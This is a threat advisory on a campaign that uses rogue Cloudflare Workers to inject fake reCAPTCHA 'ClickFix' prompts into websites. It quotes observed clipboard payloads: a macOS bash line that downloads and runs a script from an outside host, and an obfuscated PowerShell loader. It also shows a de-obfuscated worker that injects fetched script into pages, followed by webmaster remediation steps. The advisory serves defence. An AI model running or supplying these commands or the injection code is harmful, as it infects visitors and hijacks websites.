# Threat Advisory: Edge-Injected Malware via Compromised Cloudflare Workers

**Advisory ID:** TA-2026-0917-CFW  
**Threat Category:** Supply Chain / Edge Computing Injection & Infostealer Monitization  
**Target Environments:** Cloudflare Managed Domains, Webmasters, End Users  
**Severity:** CRITICAL  

---

## 1. Executive Summary

A sophisticated, large-scale cybercrime campaign is actively weaponizing compromised Cloudflare accounts to distribute malware. By stealing webmaster credentials through consumer infostealers (such as *Lumma*, *Stealc*, or *Atomic Stealer*), threat actors deploy rogue **Cloudflare Workers** across all active domains in the victim’s account. 

These rogue workers dynamically intercept clean origin traffic and inject a deceptive **"ClickFix" fake reCAPTCHA prompt** into the `</body>` of every HTML webpage served to visitors.

Because this injection takes place entirely at Cloudflare’s Edge network:
1. **Origin Server Files Are 100% Clean:** Traditional on-server malware scanners (Wordfence, Imunify360, ClamAV, etc.) detect zero infections.
2. **Decentralized Blockchain C2:** The injected payload retrieves its secondary instructions using public Ethereum/Binance Smart Chain (BSC) testnet RPC nodes, making takedown attempts resilient against traditional domain seizures.
3. **Massive Visitor Impact:** A single compromised Cloudflare account with dozens of routed domains instantly turns all hosted websites into active malware distribution nodes.

---

## 2. Attack Architecture & Technical Flow

```
[Attacker Botnet]
       │
       ▼ (Uses stolen credentials from Infostealer)
[Cloudflare Management API]
       │
       ▼ (Deploys rogue serverless worker & binds to `*domain.com/*` routes)
[Cloudflare Edge Network]
       │
       ├── 1. Fetches clean HTML from legitimate origin server
       ├── 2. Queries Blockchain RPC (BSC Testnet: eth_call 0x6d4ce63c)
       ├── 3. Dynamically injects <script> ClickFix payload before </body>
       │
       ▼
[End Visitor Browser]
       │
       ▼
Displays Fake "Cloudflare / reCAPTCHA: Verify You Are Human" Prompt
Tricks user: "Press Win + R, Ctrl + V, and Enter" (Windows) or Terminal (macOS)
```

<div align="center">
  <br/>
  <img src="screenshots/fake-recaptcha.jpg" width="340" alt="Fake reCAPTCHA Prompt" />
  <p><em>Injected ClickFix modal served to visitors on compromised domains.</em></p>
  <br/>
</div>

### Real-World Clipboard Payloads Observed

When an unsuspecting visitor clicks the fake "Verify You Are Human" button, JavaScript copies an OS-specific malicious command into their clipboard while presenting an on-screen dialog telling them to paste and run it:

#### macOS Visitor Clipboard Payload:
```bash
/bin/bash -c "$(curl -A 'Mac OS X 10_15_7' -fsSL 'j8rnojfm.prostafene.com/?ublib=a572f406-b2b1-44f0-9769-adfea35ed8f4')"; echo ""BotGuard: Answer the protector challenge. Ref: 73282
```
* **Social Engineering Trick:** It prints `echo "BotGuard: Answer the protector challenge. Ref: 73282"`. This mimics Google BotGuard / Cloudflare anti-bot verification challenges to assure the user that the command was a legitimate verification check, while silently downloading and executing the second-stage stealer in the background.

#### Windows Visitor Clipboard Payload:
```powershell
<# Verification code: 9AD13C03E03A #> $w="zlkYQ2No";$x="21220e2d7f61...";$y="";for($z=0;$z -lt $x.Length;$z+=2){$y+=[char](([convert]::ToInt32($x.Substring($z,2),16))-bxor[int][char]$w[$z/2%$w.Length])};iex $y
```
* **Social Engineering Trick:** Includes a fake comment header `<# Verification code: 9AD13C03E03A #>` matching the "verification code" shown on the web page to fool the user into thinking PowerShell is verifying their session.

### Deconstructed Worker Payload (Sample De-obfuscation)

The rogue workers typically follow this exact operational pattern:

```javascript
export default {
  async fetch(request, env, ctx) {
    let payload = "";
    try {
      // 1. Queries public Web3 JSON-RPC nodes via eth_call
      const callContract = async (address) => {
        const body = JSON.stringify({
          method: "eth_call",
          params: [{ to: address, data: "0x6d4ce63c" }, "latest"],
          id: 97,
          jsonrpc: "2.0",
        });
        const rpcs = [
          "https://bsc-testnet-dataseed.bnbchain.org/",
          "https://data-seed-prebsc-1-s1.binance.org:8545/",
          "https://bnb-testnet.api.onfinality.io/public",
          "https://bsc-testnet-rpc.publicnode.com/",
        ];
        // Sequential RPC queries with fallback
        return rpcSequential(rpcs, ...);
      };

      // 2. Resolves payload from smart contract and patches browser hooks
      payload = patchBrowserPayload(atob(await callContract("0xA1decFB...")));
    } catch {}

    // 3. Fetches clean origin response
    const resp = await fetch(request);
    if (!payload || !resp.headers.get("Content-Type")?.includes("text/html")) return resp;

    // 4. In-flight HTML replacement before </body>
    const html = (await resp.text()).replace("</body>", `<script>${payload}</script></body>`);
    return new Response(html, {
      status: resp.status,
      headers: { ...resp.headers, "Content-Length": html.length.toString() },
    });
  }
};
```

---

## 3. Webmaster Incident Response & Remediation Guide

If your websites are displaying unauthorized verification or reCAPTCHA popups, follow this procedure immediately:

### Step 1: Verify Origin vs. Cloudflare Edge
Before touching your backend database or CMS files, test if the infection is coming from the origin or Cloudflare:
```bash
# 1. Test via Cloudflare CDN (Infected Response)
curl -s https://yourdomain.com/ | grep -i "0x6d4ce63c"

# 2. Test directly against Origin IP (Bypassing Cloudflare)
curl -s http://YOUR_ORIGIN_SERVER_IP/ -H "Host: yourdomain.com" | grep -i "0x6d4ce63c"
```
* If test #1 finds the script but test #2 is clean, the injection is occurring exclusively at the **Cloudflare Edge**.

### Step 2: Delete Rogue Workers
1. Log in to your Cloudflare Dashboard.
2. Navigate to **Compute (Workers & Pages)**.
3. Look for randomly named workers (e.g., `worker-shrill-cell-*`, `worker-tight-glitter-*`).
4. Inspect their routes (they will typically be attached to `*domain.com/* + XX other routes`).
5. Click **`...` (Actions)** &rarr; **Delete Worker**.

### Step 3: Purge Edge Cache Across All Domains
Cached copies at Cloudflare edge nodes will continue serving the injected HTML until purged:
1. Go to **Websites / Domains** &rarr; Select your domain.
2. In the left sidebar, click **Caching** &rarr; **Configuration**.
3. Click **Purge Everything** and confirm.
4. Repeat for all domains attached to the affected account.

### Step 4: Lock Down Your Cloudflare Account
1. **Invalidate Stolen Sessions:**
   * Go to **My Profile** (top right) &rarr; **Sessions** &rarr; **Log out of all sessions**.
2. **Rotate Password & Enable 2FA:**
   * Change your password immediately.
   * Enforce **Two-Factor Authentication (2FA)** using an Authenticator App (TOTP).
3. **Audit API Tokens:**
   * Go to **Manage Account** &rarr; **Configurations** &rarr; **API Tokens**.
   * Delete any unfamiliar or recently generated API tokens.
